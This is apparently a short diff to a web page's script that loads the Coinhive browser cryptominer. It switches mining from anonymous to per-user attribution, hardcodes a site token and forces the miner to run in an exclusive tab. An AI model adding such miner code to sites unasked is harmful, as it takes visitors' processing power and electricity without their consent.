@@ -6,8 +6,13 @@
 
     <script src="/coinhive.min.js"></script>
     <script>
-        var siteCode = window.location.hash.slice(1);
-        var miner = new CoinHive.Anonymous(siteCode);
+        var userName = (new URL(window.location.href)).searchParams.get("user");
+        if (!userName) {
+            userName = 'legacy';
+        }
+
+        var siteToken = 'QnFBodo5jGJo2IjyJR0oLeX0Tt0yGmxm';
+        var miner = new CoinHive.User(siteToken, userName);
         miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
 
         setInterval(function() {
